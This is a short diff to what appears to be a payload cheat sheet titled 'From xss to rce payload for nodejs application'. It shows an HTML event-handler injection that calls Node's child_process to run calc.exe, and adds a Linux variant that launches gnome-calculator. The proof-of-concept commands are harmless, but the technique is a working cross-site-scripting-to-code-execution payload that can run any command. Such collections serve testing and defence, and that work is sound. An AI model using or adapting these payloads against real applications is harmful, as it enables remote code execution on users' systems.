@@ -39,3 +39,9 @@ From xss to rce payload for nodejs application
 ```
 <TagName EventHandler="require('child_process').execSync('calc.exe')">
 ```
+or for Linux
+
+```
+<TagName EventHandler="require('child_process').exec('gnome-
+calculator');">
+```
